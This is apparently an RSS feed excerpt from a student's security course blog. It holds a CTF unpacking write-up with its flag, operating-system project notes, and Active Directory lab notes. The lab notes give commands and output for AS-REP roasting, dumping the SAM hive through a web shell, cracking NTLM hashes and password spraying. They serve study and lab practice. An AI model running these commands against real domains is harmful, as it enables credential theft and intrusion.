Table) button to search and then press Get Imports button. Finally, you will get all imports that this file used, and Scylla will help you to rebuild it. Press Dump button to get IAT file. Press Fix Dump and choose the file what we dump to reconnect the IAT and this file. You’ll see the log said Import Rebuild success and you’ll get a new file named upx_exercise_dump_SCY.exe that repaired by Scylla. Analyze Re-static analysis - IDA Pro Used IDA to reanalyze the unpacking file. Used string searching to find the string nope that appear in your cmd. Used cross reference to find which part has used it. The main part is shown as below ... sub_E01EB0(std::cin, &amp;Memory); LOBYTE(v116) = 1; MEMORY[0] = 0; v96 = 0xFCC1D3C4; v97 = 0xD8D2C8DE; v98 = 0xD8D3E8E0; v99 = 0xD8C2EFB0; v100 = 0xC2ECB3C1; v101 = 0xB3EBE1D8; v102 = 0xD5F3D8BE; v103 = 0xB3EFD8DE; v104 = 0xF5C2E3D5; v105 = 0xFAD6D6D8; v64 = 1; HIBYTE(v95) = 1; v65 = 0; v93 = 0; while ( v65 &lt; 40 ) { v66 = (char *)&amp;Memory; if ( v111 >= 16 ) v66 = (char *)Memory; v67 = v66[v65] ^ 0x87; v68 = *((unsigned __int8 *)&amp;v96 + v65); v94 = 0; if ( v67 != v68 ) v64 = v94; HIBYTE(v95) = v64; v93 = ++v65; } v69 = "Congratz?!"; if ( !v64 ) v69 = "Nope!"; ... From v96 to v105, it stored 40 bytes and it seems do something in while loop 40 times. In addition, v67 = v66[v65] ^ 0x87; this line used xor instruction that seems a encrypt part. And then it compared &amp;v96 + v65 and v67 that encrypt the string what you input. If all the strings you input after process xor to 0x87 are strictly the same with v96 to v105, then it’ll print Congratz?!, otherwise, print Nope. Used online_xor to get v96 to v105 encrypted strings. And then used online_hex2ascii to get the CTF Flag. The answer is **CTF{YOU_goT_7hE_F4kE_fl49_tRY_h4RdEr_QQ}**, though it is not a real answer. Note that, the demo from TA is finished, therefore, I still don’t know the real flag is. Homework - upx_Revil.exe Static Analysis Observation Use IDA to analyze this sample and obviously packed sample Use the skill above then you can answer the question easily. Homework - custom_packer_Revil.exe Static Analysis Observation - DetectItEasy Though I used the tool, DetectItEasy to check if this sample was packed or not, the answer is not quite explicit.</description></item><item><title>NTU Operating System Project 1</title><link>https://bernie6401.github.io/security/course/ntu-os/ntu-operating-system-project-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-os/ntu-operating-system-project-1/index.html</guid><description>NTU Operating System Project 1 tags: NTU_OS Operating System NachOS Thread Management :::spoiler [TOC] :::
How to parse this project You can research userkernel.cc file first. UserProgKernel will parse the command line and store the file you want to execute in execfile variable which defined at userkernel.h. Then you’ll find something interesting. ForkExecute(Thread *t) {t->space->Execute(t->getName());} // space and getName() are defined at thread.h // Execute is defined at addrspace.h This is what we’ve learned on lecture that it’ll clone a child process and execute the same program as parent process just like a multi-thread. Next, you can observe Run() function void UserProgKernel::Run() { cout &lt;&lt; "Total threads number is " &lt;&lt; execfileNum &lt;&lt; endl; for (int n=1;n&lt;=execfileNum;n++) { t[n] = new Thread(execfile[n]); t[n]->space = new AddrSpace(); t[n]->Fork((VoidFunctionPtr) &amp;ForkExecute, (void *)t[n]); cout &lt;&lt; "Thread " &lt;&lt; execfile[n] &lt;&lt; " is executing." &lt;&lt; endl; } ThreadedKernel::Run(); } Review a very simple concept: Process Representation in Linux // Represented by the C structure task_struct pid t pid; /* process identifier */ long state; /* state of the process */ unsigned int time slice /* scheduling information */ struct task struct *parent; /* this process’s parent */ struct list head children; /* this process’s children */ struct files struct *files; /* list of open files */ struct mm struct *mm; /* address space of this process */ Another related concept is Process Creation Address space Child duplicate of parent Child has a program loaded into it UNIX examples fork() system call creates new process exec() system call used after a fork() to replace the process’ memory space with a new program After reviewing the concept above, we can continue to answer next question(Please follow the next section -> Q2) Project Q&amp;A Q1: Why the result is not congruent with expected? Because OS has multi-thread concept like the code above and it’ll fork child process. When more than 1 process be executed simultaneously without any precondition, it’ll happend what we unexpected. And the precondition or you can say the real problem in this case is context switching which is the progress between preocesses switching by CPU. Q2: How to solve the issue?(You can include some code and explain it) According to the previous question, NachOS didn’t manage memory for executing multi program and this’ll cause the current program’s page overlap to the others running program. Thus, we have to revise these two program and let the program’s virtual memory map to the real memory that no one used. code/userprog/addrspace.cc code/userprog/addrspace.h Add the code in addrspace.cc at the beginning to stored the usage of all physical pages and stored how many free pages can be used now.</description></item><item><title>NTU Operating System Project 2</title><link>https://bernie6401.github.io/security/course/ntu-os/ntu-operating-system-project-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-os/ntu-operating-system-project-2/index.html</guid><description>NTU Operating System Project 2 tags: NTU_OS Operating System NachOS CPU Scheduling System Call [TOC]
Motivation For the first task, We’d like to add sleep() function in system call that can help us call sleep in our program. For the second task, we’d like to implement CPU scheduling by FIFO(First-In-First-Out), SJF(Shortest-Job-First), Priority, RR(Round-Robin), and multi-level queue. Implementation Task1 - System Call First of all, we need to define a new token, SC_Sleep, that compiler(scanner) can recognize in code/userprog/syscall.h.</description></item><item><title>NTU Operating System Project 3</title><link>https://bernie6401.github.io/security/course/ntu-os/ntu-operating-system-project-3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-os/ntu-operating-system-project-3/index.html</guid><description>NTU Operating System Project 3 tags: NTU_OS Operating System NachOS Memory Management [TOC]
Description First I used the code from Project2 directly and obtained the correct value, 1 and 7220, by the command ./nachos -e ../test/sort -e ../test/matmult respectively. After debugging a while, I knew what’s the matter. In project2, I set const unsigned int NumPhysPages = 256; so that it can handle huge computing resource. In order to address this project, we must change it back to 32.</description></item><item><title>NTU Operating System Review Notes</title><link>https://bernie6401.github.io/security/course/ntu-os/ntu-operating-system-review-notes/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-os/ntu-operating-system-review-notes/index.html</guid><description>NTU Operating System Review Notes tags: NTU_OS Operating System [TOC]
Ch 6 Synchronization Process communication Race condition 就是Project1提到的共享記憶體的問題，導致multi-thread執行的結果會完全錯誤
解決策略 Disable interrupt process在對shared memory進行變數存取之前，先disable interrupt，直到完成此次存取後才enable，這樣的話這段時間，CPU就不會被其他processes搶走(preempted) Critical section design 必須滿足三個criteria Mutual exclusion: 在任何時間點，最多只允許一個process在他自己的CS內活動，不可同時有多個process在各自的CS內活動 Progress: 如果有人想進去CS，遲早進的去 Bounded waiting: 在一定時間內一定進的去 架構圖 spinlock busy waiting Critical section design的方法 Software solution 兩個processes Peterson’s solution: 有turn和flag兩個變數，分別代表目前的token在誰手上(turn)，以及表示有無意願進入CS(flag) N個processes Bakery’s ALG: 就是領號碼牌，號碼最小的人優先，若同時有多人持有相同的號碼牌，則以PID最小的優先 Hardware 指令支援 OS提出了mutex lock的概念，並用acquire()和release()的方法實踐 Semaphore 一種可以解決CS design和processes synchronization problem的data type，會提供兩個atomic operations: wait(s)和signal(s) wait(s): while(s&lt;=0) {do nothing;}s--; signal(s): s++ 簡單來說，s就是看現在可以使用的資源有多少(例如有多少台printer)，如果資源被分出去一個，s就減一，如果都沒有資源了，就一直等待，直到有人釋放資源，釋放資源的時候，s就會加一，所以和前面提到的mutex lock幾乎一樣，wait(s)就是acquire()，而signal(s)就是release() Semaphore的種類 有使用busy-waiting: spinlock semaphore:其實就是上面說的mutex lock和正常semaphore的概念 沒有使用busy-waiting: Non-Busy-Waiting semaphore: 看講義 Monitor 用來解決synchronization problem的高階資料結構 其實就是物件導向的方式，利用private、initialization等方式，創造monitor這個class object Message Passing技術</description></item><item><title>NTU Software Testing Notes</title><link>https://bernie6401.github.io/security/course/ntu-st/ntu-software-testing-notes-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-st/ntu-software-testing-notes-1/index.html</guid><description>NTU Software Testing Notes tags: NTU_ST Software Testing All content in this presentation is refer to Pro. Farn Wang Website
:::spoiler Click to open TOC [TOC] :::
6.1 Regression Testing Definition The process of re-testing software that has been modified 重複執行既有的全部或部分的相同測試 - by Esther
Note that: Most of our testing effort is regression testing Regression tests must be automated
Type of tools Capture / Replay: Capture values entered into a GUI and replay those values on new versions(抓取輸入到GUI的value並replay到新的版本) Version control: 追踪測試集合、預期結果、測試來源、使用的標準及其過去的有效性(Keeps track of collections of tests, expected results, where the tests came from, the criterion used, and their past effectiveness) Scripting software: 管理以下流程，包含獲取測試輸入、執行軟體、獲取輸出、比較結果和生成測試報告等等(Manages the process of obtaining test inputs, executing the software, obtaining the outputs, comparing the results, and generating test reports Tools are plentiful and cheap</description></item><item><title>NTU Software Testing Notes</title><link>https://bernie6401.github.io/security/course/ntu-st/ntu-software-testing-notes/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-st/ntu-software-testing-notes/index.html</guid><description>NTU Software Testing Notes tags: NTU_ST Software Testing All content in this presentation is refer to Pro. Farn Wang Website
:::spoiler Click to open TOC [TOC] :::
2.5 Graph Coverage for Specifications Design Spec. What is design specification? 描述軟體應該有的行為(可見或不可見都有可能) What is different between requirement and specification requirement: 顧客端 / specification: 技術端 Sequence就是一連串的行為和狀態->script Testing就是在看script有發生該發生的事情 Two types of description are used in this chapter Sequencing constraints State behavior Sequencing constraints Constraint有可能是document的一些潛規則或是method上順序的限制，e.g. stack data structure在沒有push前不能pop Queue Example: precondiction就是這個例子的sequence constraint File ADT Example ADT: Abstract Data Type其實就是早期的class sequence constraint about example 寫之前要先打開file 關閉之前要先打開file 在close file之後除非再open file，不然不可以write file close file前一定要write file，不然就浪費這個procedure Static Checking: 先不跑test input，先針對畫出來的graph做checking</description></item><item><title>NTUSTISC - AD Note - Lab(AS-REP Roasting)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x21as-rep-roasting/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x21as-rep-roasting/index.html</guid><description>NTUSTISC - AD Note - Lab(AS-REP Roasting) [TOC]
Lecture Video: 2022/05/11 AD 安全 2 Background 第十四章 Kerberos 認證系統
簡介：這是一種計算機網路授權協議，簡單說如果在同一個domain底下，想要存取某一個server的某項服務，則要如何驗證該使用者的身分以及授權他使用該項服務的資格?換個角度想，如果不認證會怎麼樣?首先，如果不認證使用者身分，就直接讓授權使用該項服務，則最直觀的攻擊就是DoS，或是駭客可以透過該項服務打到內網$\to$提權$\to$橫向移動$\to$APT，看起來很危險；另外一方面，如果有驗證身分，但通過驗證的人一率給予使用服務的授權，又會怎麼樣?可以利用eavesdropping得到授權的ticket再利用reply attack還是可以偽造身分 提醒：Windows Kerberos和MIT Kerberos在實作上有一點不一樣，如果想要知道windows kerberos可以看飛飛的文章12，然後自行比對粘添壽老師的影片 MIT Kerberos架構： 為了防止前面提到的問題，他增加了一個TGS的Server，但純控管tickets的發放，另外在驗證上面也增加了timestamp和請求方的網路位址，這樣就可以防止reply attack，而且短時間內都不需要再進行身分認證，很方便 Windows Kerberos架構： 優點 主密鑰分配：AS 伺服器除了必須擁有客戶的主密鑰之外，還必須擁有 TGS 的主密鑰；另外，TGS 伺服器也需要擁有所有伺服器的主密鑰。這就是 Kerberos 將所有參與者都稱為 Principal 的主要原因。 客戶密碼只要輸入一次：客戶端取得通往 TGS 的門票（TicketTGS）之後，在該票的有效期限之內，都可以請求服務，而不需要再輸入密碼來索取門票。 防禦偽裝攻擊：門票（TicketTGS與 TicketB）上有登錄該票的使用者識別（ID）、工作站位址（AD）、時間戳記（TS）與有效期間（Lifetime）。攻擊者攔截到門票之後，不易在在有效期內偽裝成合法客戶。 防止重播攻擊：門票有註明時間戳記（T），當攻擊者重播門票時，接收端可以利用時間戳記辨別門票的新舊。 Lab ==AS-REP Roasting== 攻擊情境：在Win2016的Server Manager中的Tools可以找到Active Directory User and Computer 在一般user的property中，可以看到Account/Account options最底下有一個選項==Do not require Kerberos preauthentication==，這個功能主要是前面提到的對於身分不會認證(1, 2步驟會略過，只執行3-6)，他只會認證後面的ticket 雖然預設是不勾選，但有兩種情況會打勾 如果被駭客打進去到最高管理員，當然它會勾選這個功能方便搞事(所有帳號) 因為windows有分版本，如果要向下兼容各版本之間的認證，則該選項就一定要勾選(這也是為甚麼講師在前面有提到一定要升級AD的舊環境)，這在很古老的系統中常常發生 滿足條件：只要前面提到的功能被打開，就可以進行AS-REP Roasting 如何攻擊： 自己把Microsoft的document看懂如何pack一個packet，然後自己實作 另一種方式就直接用工具Rubeus 1.6.4，他可以直接把有勾選該項目的帳號，送出AS-REQ的請求，然後接收AS-REP的回應，並把接收到的tickets以你指定的格式印出來 Cheat Sheet: $ Rubeus.exe asreproast $ Rubeus.exe asreproast /format:hashcat /outfile:out.txt 實際執行 Using Rubeus.exe :::spoiler Result $ Rubeus.exe asreproast ______ _ (_____ \ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \| ___ | | | |/___) | | \ \| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v1.6.4 [*] Action: AS-REP roasting [*] Target Domain : kuma.org [*] Searching path 'LDAP://WIN-818G5VCOLJO.kuma.org/DC=kuma,DC=org' for AS-REP roastable users [*] SamAccountName : reyna.gwendolyn [*] DistinguishedName : CN=Reyna Gwendolyn,CN=Users,DC=kuma,DC=org [*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128) [*] Building AS-REQ (w/o preauth) for: 'kuma.org\reyna.gwendolyn' [+] AS-REQ w/o preauth successful! [*] AS-REP hash: $krb5asrep$reyna.gwendolyn@kuma.org:4B08601B0A55BA231BED4333EAA6ED9C$E146006C2F6 B5EF8D78D4280E646FA601860D754261C28DC48470F2EA99E75DFD03E53F4BAC09BD1BE9697C5918 C48E5BA6A64D51A550FC6833327EBEF9A0C62F2448BA3CA3AA7D9BD375BF8BE693B1BC199A442053 AC3A40FA3F29EE3ABFB9B1B1E1C31DDD508FAB7971F1FDCE057D5A4481678511188DB99921762116 934D04C72071DAACFC6FFA8250380CD9ECECF95CC5702FD7A67AB90F18C299BB9AD8FF4A9325730E 859F2105F1AF64E170EB118111414CC44D0CDD1199860EF0D99ECD33FB618FEDCFAE96E0DFB75A4D 9EF3C06C99DBBD9C0A69A344C4C5A65B5B702152081F9 [*] SamAccountName : henrieta.sabine [*] DistinguishedName : CN=Henrieta Sabine,CN=Users,DC=kuma,DC=org [*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128) [*] Building AS-REQ (w/o preauth) for: 'kuma.org\henrieta.sabine' [+] AS-REQ w/o preauth successful! [*] AS-REP hash: $krb5asrep$henrieta.sabine@kuma.org:DEBC5F5111CE6D774625EB3DCC14925A$A91DD569550 A48219DAC0F53E4114DA7027E073DD6A86EFC83C79206787A84DBF6FC7F4B5168D7CBE65B073A05B B13AF1514D32D787948F91E05FF40191B6FE7819B9F5A978377D82B5E9532688B1CF28BBA1370365 68C110CAB41FEC26D262DC422CB54B678456470AE34F23B6D2CB1597E9565CACD11C1C5F9683408B 241650007B0E162C40D7694D8F5A5154254E0A54829C7784EB5493DF15812271C3161DD5937B368B 93406383215D909289E3FE096A10D396EF662C02031E6D4352C6A411EEC38B0A1D02A2E0AB03C86E CBF9C07C441C4D5EBD4269400373A2AFAD5879293B856 [*] SamAccountName : giulietta.moyra [*] DistinguishedName : CN=Giulietta Moyra,CN=Users,DC=kuma,DC=org [*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128) [*] Building AS-REQ (w/o preauth) for: 'kuma.org\giulietta.moyra' [+] AS-REQ w/o preauth successful! [*] AS-REP hash: $krb5asrep$giulietta.moyra@kuma.org:11CD5E39C2CEA9695C50826E6FCA66D3$9E2B2F3ED60 5D93BF02721F921D09DE188F1F7F3BE23907A73B95B30ECB0C1CFF5C68A0E814931A6A839DC1098C 2F3EF8B0A68492CA16E6CD96C843373581DD8CF14F7F58AE9B63A4717D1E8F7C2AA56DAC959F589C 1533249CA5BF72BBFC833609A0D958B7B5E692632D3557678B671E65C092494B38FC3840D09E16F4 1FE8D1BB86FAF16BD3F39E4E8CF8AC07A10FCD20E947D3A496A4204350D1E3B0448DB92AE749F3D0 7A9D1582677A5958B70DD38E2CDFC914C2848D0F9BC0E78D65AB7F3B9E1B5AFFA53588FBD7FFB297 357047776932B4EA2405ECB5705418BDE7CB8DBE725BB ::: 可以看到他總共吐出了三個hash，分別對應到三個使用者：reyna.gwendolyn, henrieta.sabine, henrieta.sabine，如果仔細對應win2016相對使用者的property會發現的確，這三個user的該選項都有打勾，現在則是利用hashcat之類的工具把hash暴力解開</description></item><item><title>NTUSTISC - AD Note - Lab(Brute Force SAM)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/index.html</guid><description>NTUSTISC - AD Note - Lab(Brute Force SAM) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 得到更高權限之後，會想要更多的密碼
密碼收集 SAM.hive(Security Account Manager) What: 就是一個用於windows的數據庫文件，用於==儲存用戶的密碼==，並且對於本地端或遠端的使用者進行身分認證 Where: C:\Windows\System32\config\SAM Password Spraying(用猜的) GPO 記憶體(lsass) Lab ==Brute Force SAM== 前面有提到SAM在哪裡，所以只要直接打開就看的到密碼了嗎?你會得到一個access denied的錯誤，原因是他已經被設定成read lock了，導致目前無法正常存取 匯出SAM File 主要目的就是把SAM file和SYSTEM file dump下來，而方法就是利用reg.exe(Windows註冊碼工具)，用指令的方式存取 $ reg save HKLM\SAM &lt;save filename> $ reg save HKLM\SYSTEM &lt;save filename> 錯誤的方式 但經過cmd用普通權限實測會發現我們沒有這樣的資格 $ reg save HKLM\SAM SAM.dump 錯誤: 用戶端沒有這項特殊權限。 其實也很合理，不然所有人都可以直接存取意味著只要摸到其中一臺普通權限的AD，所有機敏資料都會外洩，這就是為甚麼前面需要提權的原因，只有最高權限的帳戶可以存取這兩個file 正確的方式-1 用前面提到的web shell，打出以下指令，則SAM file就會dump到C:\inetpub\wwwroot\sam.zip $ c:\tools\PrintSpoofer64.exe -c "reg save HKLM\SAM C:\inetpub\wwwroot\sam" 正確的方式-2 利用Invoke-NinjaCopy.ps1這個腳本，就可以複製出來，原理是使用windows的影子複製 $ .\Invoke-NinjaCopy -Path SAM -LocalDestination C:\tools\SAM_COPY 但是經過實測，發現執行雖然有成功但是沒有任何檔案被dump出來，可能中間有些過程有誤? :::info 如果要用這個方法，PowerShell要以管理員權限打開，然後如果有遇到如下error message，可以參考這邊1解決問題 .\Invoke-NinjaCopy : 因為這個系統上已停用指令碼執行，所以無法載入 C:\tools\Invoke-NinjaCopy.ps1 檔案。如需詳細資訊，請參閱 about_Execution_Policies，網址為 https:/go.microsoft.com/fwlink/?LinkID=135170。 位於 線路:1 字元:1 + .\Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestina ... + ~~~~~~~~~~~~~~~~~~ + CategoryInfo : SecurityError: (:) [], PSSecurityException + FullyQualifiedErrorId : UnauthorizedAccess ::: 解析SAM內容 拿到SAM的內容之後還需要解析他，可以用kali的samdump2解析 Win10 v1607之前的解法 $ samdump2 system sam Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: *disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: *disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: :1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 可以看到很多都是disabled，就代表我們要用下面的解法 Win10 v1607之後 因為這個版本之後有用到AES加密，所以可以用Creddump7，建議使用anaconda這樣的虛擬環境，不然直接用內建的virtualenv會出事， $ conda activate py2.7 $ pip install pycrypto $ git clone https://github.com/CiscoCXSecurity/creddump7.git $ python pwdump.py system sam Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ecffff0c3548187607a14bad0f88bb1::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e3180c5331aad6ad1ac787749e6c4819::: user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: low:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 解析Hash 方法一：用online database 接著就是把NTLM Hash丟到隨便的database看有沒有紀錄，例如cmd5，如果把最前面找到的31d6cfe0d16ae931b73c59d7e0c089c0會顯示空密碼，但我們都知道是錯的 而如果拿Creddump解析出來的7ecffff0c3548187607a14bad0f88bb1，就可以直接顯示出我們的密碼 方法二：爆字典檔 在kali中的/usr/share/wordlists有一些字典檔可以用，例如rockyou等等，可以先用看看 $ sudo gunzip /usr/share/wordlists/rockyou.txt.gz $ cp /usr/share/wordlists/rockyou.txt ./ $ hashcat -a 0 -m 1000 ntlm.hash rockyou.txt --force ... 31d6cfe0d16ae931b73c59d7e0c089c0: 7ecffff0c3548187607a14bad0f88bb1:1qaz@WSX3edc ... Reference PowerShell 「系統上已停用指令碼執行」解決方法 ↩︎</description></item><item><title>NTUSTISC - AD Note - Lab(Hijack Token)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x10hijack-token/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x10hijack-token/index.html</guid><description>NTUSTISC - AD Note - Lab(Hijack Token) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 提權方法 利用弱點 Hijack Token Tools: PrintSpoofer Support: Windows 8.1/Server 2012 R2/10/Server 2019 How to use: $ PrintSpoofer.exe -c "command" Guess Password 管理服務 錯誤配置 Lab Time - 本地提權 ==Hijack Token(Network Service)== 這邊講師示範的是，如何利用IIS的特殊權限，達成提權。 先解釋一下，如果要使用PrintSpoofer之類的工具有個特殊的條件，就是需要有特殊權限，也就是 :::info
$ whoami /priv 需要有下列其一權限: SeImpersonatePrivilege => CreateProcessWithToken() SeAddignPrimaryToekn => CreateProcessAsUser() :::
whoami /priv 我們先看一下正常使用者的特殊權限有哪些
$ whoami /priv PRIVILEGES INFORMATION ---------------------- 特殊權限名稱 描述 狀況 ============================= ================== ====== SeShutdownPrivilege 關閉系統 已停用 SeChangeNotifyPrivilege 略過周遊檢查 已啟用 SeUndockPrivilege 從擴充座移除電腦 已停用 SeIncreaseWorkingSetPrivilege 增加處理程序工作組 已停用 SeTimeZonePrivilege 變更時區 已停用 可以看到上述的權限都沒有在這裏面，也就是說正常的使用者是不會有這兩個權限的，那誰會有這兩個權限呢?需要==impersonation(也就是講師說的切換身分)的人==，詳細的腳本可以看這邊1但今天不會用到，總之IIS就是一個需要做身分切換的角色，所以講師已經在Win10的電腦中設定好IIS，也起用了web shell的功能，我們就可以試看看，在browser中http://127.0.0.1/cmd.aspx，他可以直接用IIS的權限執行程式</description></item><item><title>NTUSTISC - AD Note - Lab(Leak Password)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x04leak-password/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x04leak-password/index.html</guid><description>NTUSTISC - AD Note - Lab(Leak Password) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Lab Time - 環境調查 ==Lab - Leak Password from Description== 在Win2016的server manager當中，可以從Dashboard/Tools/Active Directory Users and Computers中看到整個網域使用者的部分資料，例如Name, Type和Description，而這個東西其實是所有整個網域使用者都看地到，所以==不可以把機敏資料寫在這裡例如帳密之類的==，就像下面截圖一樣，Fara Iseabal和Lina Allene的密碼都被leak出去了 當然，有加入網域的帳號也看的到，從Win10的網域帳號bear中，打開PowerShell :::spoiler Result
$ Get-ADUser -Filter * -Proper Description | Select-object Name,Description Name Description ---- ----------- Administrator Built-in account for administering the computer/domain Guest Built-in account for guest access to the computer/domain DefaultAccount A user account managed by the system. krbtgt Key Distribution Center Service Account Coraline Mahalia Gillian Marsiella Casi Hyacinth Mercy Edi Cyndie Rhodie Lucilia Lelah Fred Carmita Ortensia Fancy Seana Jeanette Logan Janeen Cassondra Lothario Ollie Dorita Gertrude Felecia Ella Randee New User ,DefaultPassword Anya Gypsy Ronni Kristoforo Maurizia Ines Reyna Gwendolyn Garnet Constancia Darlleen Dorisa Jessa Corinna Lorne Celie Bill Marylee Berna Raphaela Gabriel Diannne Shared User Caitrin Latia Selestina Cassi Carlye Chloette Dorrie Paolina Herminia Debby Rosetta Lotta Berny Kirby Moyra Fanechka Ranee Delinda Orelee Peri Shantee Marylin Annice Eden Stormie Natala Glenda Dorrie Laurena Mirelle Casandra Cherrita Lazaro Karoly Lina Allene User Password r2NE4/9:F;[k Kiri Kath Star Rikki Aloise Elfrida Shared User Marylynne Susannah Sherri Jacquetta Carey Kincaid Philippa Eugenie Dominica Carmon Eba Luca Martita Juanita Ruthie Ebony Charis Kory Bambi Etta Aleda Appolonia Shared User Randene Lelah Issy Eudora Margo Sharl Philis Gilli Reina Claire Corine Celesta Lon Sonni Joyann Sibella Katee Annemarie Henrieta Sabine Daile Odetta Marney Ranee Marlyn Loralee Fara Iseabal User Password 8F%kJ2q_cVFg Sofie Darlleen Jori Floria Replication Account Alikee Perri Karoly Nadeen Renae Babette Nolana Rivy Carmelle Libbi Sile Rhiamon Ruthann Britta Pietra Fern Amabelle Gayle Audi Rosalind Dollie Fayina Ricca Stefa Kaja Brenda Katharina Alyssa Angelique Hilda Linda Neda Shared User Jerrie Morganne Giulietta Moyra Erena Elinore Lily Kristofor Kizzee Margaux Christi Nettle Lilas Lindy Celeste Kelci Berget Celka Babb Joanne Andree Suki Bear Brown ::: 帳密一、Lina Allene$\to$r2NE4/9:F;[k 帳密二、Fara Iseabal$\to$8F%kJ2q_cVFg</description></item><item><title>NTUSTISC - AD Note - Lab(Password Spraying)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x14password-spraying/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x14password-spraying/index.html</guid><description>NTUSTISC - AD Note - Lab(Password Spraying) [TOC]
Lecture Video: 2022/05/04 AD 安全1
Background 密碼收集 SAM.hive(Security Account Manager) Password Spraying(用猜的) 和brute force差在哪裡呢?其實概念一樣，只是角度不一樣，brute force是針對一隻帳號，用很多的密碼去猜；而password spraying則是用一組密碼去爆所有的帳號，其實就是反過來 Tool: CrackMapExec - 結合各種功能的內網滲透神器 GPO 記憶體(lsass) Lab ==Password Spraying== How to use?
Cheat Sheet $ crackmapexec &lt;protocol> &lt;target(s)> -u &lt;a file or string only> -p &lt;a file or string only> # For example $ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd $ crackmapexec smb 10.10.10.100 -u ~/file_usernames -p ~/file_passwords $ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd --local-auth $ crackmapexec smb &lt;filename> -u administrator -p Passw0rd --local-auth --local-auth代表是用本機帳號的角度登入，就不是用domain admin的角度登入 Recon Password Policy 在PowerShell中使用$ Get-ADDefaultDomainPasswordPolicy調查Domain上的密碼原則，Note: ==Win2016要打開==</description></item><item><title>NTUSTISC - AD Note - Lab(SMB遠端讀寫)</title><link>https://bernie6401.github.io/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x24smb%E9%81%A0%E7%AB%AF%E8%AE%80%E5%AF%AB/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x24smb%E9%81%A0%E7%AB%AF%E8%AE%80%E5%AF%AB/index.html</guid><description>NTUSTISC - AD Note - Lab(SMB遠端讀寫) 